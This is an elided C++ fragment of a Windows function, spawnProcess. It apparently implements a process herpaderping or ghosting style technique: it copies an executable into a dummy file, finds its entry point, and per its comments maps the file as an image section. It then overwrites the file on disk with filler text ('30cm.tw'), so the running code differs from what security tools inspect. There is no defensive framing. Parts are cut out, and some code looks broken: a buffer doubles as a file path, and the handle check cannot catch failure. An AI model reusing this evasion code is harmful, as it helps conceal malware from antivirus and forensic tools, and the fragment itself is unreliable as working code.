...
int spawnProcess(LPCWSTR exeToRun, LPCWSTR fakePath)
{
    ...
    fptrPeModule = CreateFileW(LPWSTR(dummy), SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0);
    fptrPeDataSrc = CreateFileW(exeToRun, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (size_t(fptrPeModule) < 1 || size_t(fptrPeDataSrc) < 1) return -1;

    //   step 2: copy file from src to dummy file & create it as a image_section 
    // step 2.1: locate the entry pointer of the PE file
    std::wcout << L"[v] copy PE data from source to dummy file" << std::endl;
    while (ReadFile(fptrPeDataSrc, dummy, sizeof(dummy), &dwRead, 0) && dwRead) {
        if (!payload_ep) payload_ep = get_entry_point_rva(dummy);
        WriteFile(fptrPeModule, dummy, dwRead, 0, 0);
    }
    ...
    SetFilePointer(fptrPeModule, 0, 0, FILE_BEGIN);
    for (size_t indx(512); indx-- > 0; ) WriteFile(fptrPeModule, "30cm.tw\n", 8, 0, 0);
